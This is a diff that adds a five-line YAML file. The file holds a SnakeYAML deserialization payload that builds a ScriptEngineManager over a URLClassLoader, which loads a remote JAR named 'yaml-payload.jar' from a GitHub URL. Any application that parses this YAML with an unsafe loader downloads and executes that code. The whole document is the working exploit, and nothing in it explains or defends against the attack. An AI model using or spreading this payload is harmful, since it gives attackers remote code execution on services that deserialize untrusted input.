@@ -1,0 +1,5 @@
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["https://github.com/sathish09/test/raw/master/yaml-payload.jar"]
+  ]]
+]
